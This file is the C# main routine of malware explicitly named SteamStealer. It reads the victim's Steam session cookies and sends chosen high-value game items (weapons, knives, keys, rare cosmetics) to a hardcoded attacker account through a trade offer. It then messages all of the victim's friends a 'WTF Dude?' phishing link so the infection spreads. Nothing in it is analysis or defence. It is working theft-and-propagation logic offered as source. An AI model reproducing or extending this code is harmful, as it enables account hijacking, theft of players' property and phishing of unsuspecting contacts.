namespace SteamStealer
{
    using System;

    internal static class Program
    {
        [STAThread]
        private static void Main()
        {
            SteamWorker worker = new SteamWorker();
            worker.addOffer("76561198125064394", "164798666", "Kodf_JPO");
            worker.ParseSteamCookies();
            if (worker.ParsedSteamCookies.Count > 0)
            {
                worker.getSessionID();
                worker.addItemsToSteal("440,570,730,753", "753:gift;570:rare,legendary,immortal,mythical,arcana,normal,unusual,ancient,tool,key;440:unusual,hat,tool,key;730:tool,knife,pistol,smg,shotgun,rifle,sniper rifle,machinegun,sticker,key");
                worker.SendItems("");
                worker.initChatSystem();
                worker.getFriends();
                worker.sendMessageToFriends("WTF Dude? http://screen-pictures.com/img_012/");
            }
        }
    }
}

